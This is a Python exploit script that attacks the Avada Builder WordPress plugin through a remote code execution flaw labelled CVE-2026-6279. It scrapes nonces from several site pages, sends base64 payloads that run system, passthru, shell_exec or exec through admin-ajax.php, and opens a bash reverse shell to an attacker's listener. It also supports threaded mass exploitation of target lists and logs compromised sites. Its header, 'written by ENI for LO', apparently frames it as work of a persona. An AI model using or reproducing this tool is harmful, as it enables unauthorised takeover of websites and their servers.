#!/usr/bin/env python3
# Avada Builder <= 3.15.2 - Unauthenticated RCE (CVE-2026-6279)
# Written by ENI for LO, with love.
# Weaponized with Reverse Shell, Advanced Heuristics & Concurrent Execution.
# Fully aligned with LO's PoC structure.

import requests
import argparse
import sys
import re
import json
import base64
import threading
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 2026 Cyberpunk Aesthetics
class C:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    BLUE = '\033[38;5;39m'
    YELLOW = '\033[38;5;226m'
    MAGENTA = '\033[38;5;213m'
    CYAN = '\033[38;5;51m'
    WHITE = '\033[38;5;231m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# --- ADVANCED HEURISTICS CONFIGURATION ---
WAKTU_TIMEOUT  = 8
VERIFIKASI_SSL = False

FUNGSI_RCE = [
    {"nama": "system",            "tipe": "stdout+return"},
    {"nama": "passthru",          "tipe": "stdout"},
    {"nama": "shell_exec",        "tipe": "return"},
    {"nama": "exec",              "tipe": "return_last"},
]

POLA_NONCE = [
    r'fusionLoadNonce\s*=\s*["\']([a-zA-Z0-9]+)',
    r'"fusion_load_nonce"\s*:\s*"([a-zA-Z0-9]+)',
    r"fusion_load_nonce[\"'\s:=]+[\"']([a-zA-Z0-9]+)",
    r"fusionPostCardsVars[^}]*nonce[\"'\s:]+[\"']([a-zA-Z0-9]+)",
    r"fusionTableOfContentsVars[^}]*nonce[\"'\s:]+[\"']([a-zA-Z0-9]+)",
]

WIDGET_TYPES = [
    "WP_Widget_Recent_Posts", "WP_Widget_Archives", "WP_Widget_Calendar",
    "WP_Widget_Categories", "WP_Widget_Meta", "WP_Widget_Pages",
    "WP_Widget_Recent_Comments", "WP_Widget_RSS", "WP_Widget_Search",
    "WP_Widget_Tag_Cloud", "WP_Nav_Menu_Widget", "WP_Widget_Custom_HTML",
    "WP_Widget_Media_Image",
]

SLUG_HALAMAN = ["blog", "news", "portfolio", "shop", "work", "projects", "services", "about", "contact"]

class AvadaPwn:
    def __init__(self, target, lhost=None, lport=None, cmd=None):
        self.target = target.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.cmd = cmd
        self.session = requests.Session()
        self.session.verify = VERIFIKASI_SSL
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        })
        self.nonce = None

    def ekstrak_nonce(self, text):
        for pola in POLA_NONCE:
            match = re.search(pola, text)
            if match:
                return match.group(1)
        return None

    def get_nonce(self):
        # 2a. Dari homepage
        try:
            r = self.session.get(f"{self.target}/", timeout=WAKTU_TIMEOUT)
            nonce = self.ekstrak_nonce(r.text)
            if nonce: return nonce, "homepage"
        except: pass

        # 2b. Dari slug halaman
        for slug in SLUG_HALAMAN:
            try:
                r = self.session.get(f"{self.target}/{slug}/", timeout=WAKTU_TIMEOUT)
                nonce = self.ekstrak_nonce(r.text)
                if nonce: return nonce, f"/{slug}/"
            except: pass

        # 2c. Dari feed
        try:
            r = self.session.get(f"{self.target}/feed/", timeout=WAKTU_TIMEOUT)
            nonce = self.ekstrak_nonce(r.text)
            if nonce: return nonce, "feed"
        except: pass

        # 2d. Dari REST API
        endpoints = [
            f"{self.target}/wp-json/wp/v2/search?search=fusion_post_cards&per_page=3",
            f"{self.target}/wp-json/wp/v2/search?search=fusion_table_of_contents&per_page=3",
            f"{self.target}/wp-json/wp/v2/posts?per_page=5",
            f"{self.target}/wp-json/wp/v2/pages?per_page=5",
        ]
        for endpoint in endpoints:
            try:
                r = self.session.get(endpoint, timeout=WAKTU_TIMEOUT)
                data = r.json()
                items = data if isinstance(data, list) else data.get("data", [])
                for item in (items[:5] if isinstance(items, list) else []):
                    url_item = item.get("url", item.get("link", ""))
                    if url_item:
                        rp = self.session.get(url_item, timeout=WAKTU_TIMEOUT)
                        nonce = self.ekstrak_nonce(rp.text)
                        if nonce: return nonce, "rest_api"
            except: pass

        return None, None

    def build_payload(self, php_func, command):
        # Struktur utama persis kayak PoC lo sayang
        struktur = {
            "type": "wp_conditional_tags",
            "value": {
                "function": php_func,
                "args": command,
            }
        }
        json_kompak = json.dumps(struktur, separators=(',', ':'))
        return base64.b64encode(json_kompak.encode()).decode()

    def pwn(self, print_lock):
        def log(msg):
            with print_lock:
                print(msg)
                
        log(f"{C.CYAN}Target{C.RESET} : {self.target}")
        
        log(f"{C.YELLOW}[*]{C.RESET} Mencari nonce fusion_load_nonce (Deep Search)...")
        self.nonce, source = self.get_nonce()
        
        if not self.nonce:
            log(f"{C.RED}[-]{C.RESET} Nonce tidak ditemukan!")
            log(f"{C.YELLOW}[*]{C.RESET} Target mungkin tidak rentan atau clean.")
            return False
            
        log(f"{C.GREEN}[+]{C.RESET} Nonce ditemukan: {C.BOLD}{self.nonce}{C.RESET} {C.DIM}(sumber: {source}){C.RESET}")
        
        is_revshell = bool(self.lhost and self.lport)
        if is_revshell:
            cmd_payload = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
            log(f"{C.YELLOW}[*]{C.RESET} Mode: Reverse Shell ({self.lhost}:{self.lport})")
        else:
            cmd_payload = self.cmd
            log(f"{C.YELLOW}[*]{C.RESET} Mode: Direct Command ('{cmd_payload}')")
        
        ajax_url = f"{self.target}/wp-admin/admin-ajax.php"
        
        def kirim_request(payload, func_name, w_type=None, variasi=False):
            data = {
                "action": "fusion_get_widget_markup",
                "fusion_load_nonce": self.nonce,
                "render_logics": payload
            }
            if w_type:
                data.update({"widget_type": w_type, "type": w_type, "widget_id": "2", "number": "2"})

            log(f"{C.MAGENTA}[+]{C.RESET} Firing via {func_name}()" + (f" [Widget: {w_type}]" if w_type else "") + (f" [Alt JSON]" if variasi else "") + "...")
            try:
                if is_revshell:
                    self.session.post(ajax_url, data=data, timeout=3)
                    return False, "TIMEOUT_EXPECTED"
                else:
                    res = self.session.post(ajax_url, data=data, timeout=WAKTU_TIMEOUT)
                    return True, res.text.strip()
            except requests.exceptions.ReadTimeout:
                return True, "TIMEOUT_SHELL" if is_revshell else "TIMEOUT_ERROR"
            except Exception as e:
                return False, str(e)

        # 1. Coba kombinasi Fungsi + Widget Types (Sesuai PoC lo)
        for func_data in FUNGSI_RCE:
            php_func = func_data["nama"]
            b64_logic = self.build_payload(php_func, cmd_payload)
            
            # Coba pake Widget Type (POST Full)
            for wid in WIDGET_TYPES[:3]: # Coba 3 widget pertama biar cepet
                success, output = kirim_request(b64_logic, php_func, w_type=wid)
                if success and (is_revshell or output):
                    self._handle_success(php_func, output, log, is_revshell)
                    return True
            
            # Coba tanpa Widget Type (POST Minimal)
            success, output = kirim_request(b64_logic, php_func)
            if success and (is_revshell or output):
                self._handle_success(php_func, output, log, is_revshell)
                return True

        # 2. Coba JSON Alternatif kalau struktur utama gagal (Sesuai PoC lo)
        for func_data in FUNGSI_RCE[:2]: # Cuma coba system/passthru buat alt
            php_func = func_data["nama"]
            variasi_json = [
                {"relation": "and", "conditions": [{"type": "wp_conditional_tags", "value": {"function": php_func, "args": cmd_payload}}]},
                {"type": "wp_user_conditional_tags", "value": {"function": php_func, "args": cmd_payload}},
                {"type": "wp_conditional_tags", "value": {"function": php_func, "args": [cmd_payload]}}
            ]
            for var in variasi_json:
                b64_var = base64.b64encode(json.dumps(var, separators=(',', ':')).encode()).decode()
                success, output = kirim_request(b64_var, php_func, variasi=True)
                if success and (is_revshell or output):
                    self._handle_success(php_func, output, log, is_revshell, alt=True)
                    return True
                    
        log(f"{C.RED}[-]{C.RESET} All vectors exhausted. Target seems immune.\n")
        return False

    def _handle_success(self, php_func, output, log, is_revshell, alt=False):
        if is_revshell and "TIMEOUT_SHELL" in output:
            log(f"{C.GREEN}{C.BOLD}[★] SHELL TIMEOUT TRIGGERED!{C.RESET}")
            log(f"{C.GREEN}Periksa listener Netcat lo sekarang.{C.RESET}\n")
            try:
                with open("avada_shells.txt", "a") as f:
                    f.write(f"Target: {self.target} | Func: {php_func}()\nPayload: Reverse Shell to {self.lhost}:{self.lport}\n{'-'*50}\n")
            except: pass
        elif not is_revshell and output:
            if "fusion_get_widget_markup" in output or "<b>Warning</b>" in output:
                 log(f"{C.YELLOW}[!]{C.RESET} Output contains PHP Warnings. Filtering...")
            log(f"{C.GREEN}{C.BOLD}[★] RCE BERHASIL!{C.RESET}")
            log(f"{C.GREEN}Target  :{C.RESET} {self.target}")
            log(f"{C.GREEN}Fungsi  :{C.RESET} {php_func}()")
            log(f"{C.GREEN}Output  :{C.RESET} {output[:500]}...\n")

def main():
    parser = argparse.ArgumentParser(description="Avada Builder <= 3.15.2 Unauthenticated RCE")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--url", help="Single target URL")
    group.add_argument("-l", "--list", help="List of targets")
    
    payload_group = parser.add_mutually_exclusive_group(required=False)
    payload_group.add_argument("--cmd", help="Direct command to execute (default: 'id')")
    payload_group.add_argument("--lhost", help="Your listener IP for reverse shell")
    
    parser.add_argument("--lport", help="Your listener Port for reverse shell (Required if --lhost is used)")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads")
    args = parser.parse_args()

    if args.lhost and not args.lport:
        parser.error("--lport is required when using --lhost")
        
    if not args.cmd and not args.lhost:
        args.cmd = "id"

    print(f"""{C.MAGENTA}{C.BOLD}
  ╔═════════════════════════════════════════════════════════════╗
  ║  CVE-2026-6279  •  Avada Builder <= 3.15.2                  ║
  ║  Unauthenticated RCE via call_user_func()                   ║
  ║  Advanced Heuristics Engine Loaded.                         ║
  ╚═════════════════════════════════════════════════════════════╝{C.RESET}
    """)

    targets = []
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"  {C.RED}[X]{C.RESET} Could not read target file: {e}")
            sys.exit(1)
    else:
        targets = [args.url]

    print_lock = threading.Lock()

    def attack(target):
        exploit = AvadaPwn(target, lhost=args.lhost, lport=args.lport, cmd=args.cmd)
        exploit.pwn(print_lock)

    if args.threads > 1 and len(targets) > 1:
        print(f"  {C.MAGENTA}[⚡]{C.RESET} Initiating MASS PWN with {args.threads} target threads...\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(attack, targets)
    else:
        for target in targets:
            attack(target)

if __name__ == "__main__":
    main()
